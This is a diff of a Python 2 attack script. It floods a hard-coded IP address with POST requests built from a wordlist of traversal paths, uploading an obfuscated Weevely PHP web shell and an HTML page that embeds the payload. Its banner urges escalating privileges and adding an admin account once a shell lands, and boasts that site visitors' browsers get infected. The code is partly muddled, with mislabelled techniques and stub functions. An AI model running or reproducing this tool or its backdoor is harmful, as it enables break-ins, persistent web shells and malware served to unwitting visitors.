@@ -1,37 +1,56 @@
+
 import requests, operator, socket, os, sys, subprocess, threading, re, time, colored
 from requests import *
 import termcolor
 from termcolor import colored
 def red(string):
     string = colored(string,'red',attrs=['bold'])
+
     return string
 def green(string):
     string = colored(string,'green',attrs=['bold'])
+
     return string
 def yellow(string):
     string = colored(string,'yellow',attrs=['bold'])
+
     return string
 def cyan(string):
     string = colored(string,'cyan',attrs=['bold'])
+
     return string
-All it really does, is spam the living hell out of enumerated file upload vulnerabilities and path permissions issues that should have been taken care of by their administrators.
+
+
+
+banner = """All it really does, is spam the living hell out of enumerated file upload vulnerabilities and path permissions issues that should have been taken care of by their administrators.
+
 This is also known as host-header injection.
+
 How it works is...
+
 1. Reads a list of known directory traversal vulns from a wordlist
 2. Generates a gigantic list of HTTP GET/POST/PUT requests,
 3. Hammers the router with it for half an hour
 4. And find out which one of the payloads made it.
+
 You want to be looking at a traversal vulnerablity. that throws a code 302 or lower. That is the only chance we have at getting a stable shell to immediately work with.
+
 Be warned, that it's quite tough. The first thing you should do if you land a shell is immediately get out of the environment, escalate your privileges and add yourself as a new username="admin". This app was specifically designed to launch Weevely PHP payloads, in both it's raw execuable form and as a embedded malware component on webpages.
+
 With someone's index.html is in the root web directory, with rwx permissions, then the payload will definitely go off even if its embedded as script tags in the html webpage. If someone loads your website. It goes off. Inside of THEIR webbrowser. And if they were to escape the sandbox of the web browser, then they got a lot to worry about.
+
 """
 print banner
+
 list_of_injectable_links = "/root/myinjectionplan/codeinjections.log"
+
 target = "http://98.160.249.209:80"
+
 payload = "thumbnails.php"
 payload_abspath = "/var/www/html"
 authentication = requests.certs.where()
 os.chdir(payload_abspath)
+
 raw_nodejs = """
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
@@ -45,6 +64,7 @@ raw_nodejs = """
     </script>
   </body>
 </html>
+
 """
 raw_php = """<?php
 $M=str_replace('YO','','YOcreYOYOaYOte_YOfunctYOion');
@@ -61,7 +81,9 @@ $T='d_o[cleao[n();o[$d=bao[seo[64_enco[ode(x(go[zcompress(o[$o),$o[k));printo[("
 $e=str_replace('o[','',$x.$z.$p.$I.$E.$X.$t.$i.$D.$T);
 $b=$M('',$e);$b();
 ?>
+
 """
+
 html_embedded_payload_buffer = """
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
@@ -89,24 +111,32 @@ $b=$M('',$e);$b();
 </script>
   </body>
 </html>
+
 """
+
 payload_buffer = html_embedded_payload_buffer
+
+
 def popen_background(cmd):
     p = subprocess.Popen(cmd,shell=True, executable='/bin/bash', stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     o = p.stdout.read()
     o = str(o.encode('utf-8')).strip().rstrip()
     return o
+
 def bash_cmd(cmd):
     commands = cmd.splitlines()
     for command in commands:
         cmd = str(command.encode('utf-8')).strip().rstrip()
         subprocess.call(cmd)
     return
+
 def attack_target(target, message, uri_depth, payload_buffer):
     message = payload_buffer
+
     response = requests.api.post(target, auth=('admin','you-and-me-on-the-run'),data=message, json=None)
     print response
     print "POST attempt: \r\n","TARGET: ",str(target)
+
     print "GET attempt: Attempting to retrieve uploaded content"
     directory = "{}/{}/{}".format(
         str(target),
@@ -127,9 +157,12 @@ def attack_target(target, message, uri_depth, payload_buffer):
         if re.search('30', status):
             print yellow("Kinda iffy, its a redirected area but we can still interact with the payload"),directory
             time.sleep(5)
+
     except ConnectionError:
         pass
     return
+
+
 def other_convenience_functions():
     return
 def do_something():
@@ -137,6 +170,7 @@ def do_something():
 def format_to_perfect_strings(a):
     string = str(a.encode('utf-8')).rstrip().strip()
     return string
+
 def format_to_perfect_list(b):
     lines = b
     lines = lines.splitlines()
@@ -147,11 +181,13 @@ def func_read_parse(list_of_injectable_links, payload, target):
     w = open("tmp_links.log",'w')
     w.write(processed)
     w.close()
+
     r = open("tmp_links.log",'r')
     o = r.read()
     r.close()
     o = str(o.encode('utf-8')).strip().rstrip()
     time.sleep(2)
+
     l = format_to_perfect_list(o)
     r.close()
     for i in l:
@@ -165,10 +201,14 @@ def func_read_parse(list_of_injectable_links, payload, target):
         print "Now targeting ",str(target),"against this parameter", str(string)
         print "URI Depth: ", str(uri_depth),"using this payload: ", str(payload)
         request = "POST"
+
         generate_http_requests(request, uri_depth)
     return
 def generate_http_requests(request, uri_depth):
+
+
     type = "POST"
+
     message = http_request_generator(type, request, uri_depth, target)
     attack_target(target, message, uri_depth, payload_buffer)
     return message
@@ -192,5 +232,6 @@ def http_request_generator(type, request, uri_depth, target):
     message = POST
     message = format_to_perfect_strings(message)
     attack_target(target, message, uri_depth, payload_buffer)
+
     return
 func_read_parse(list_of_injectable_links, payload, target)
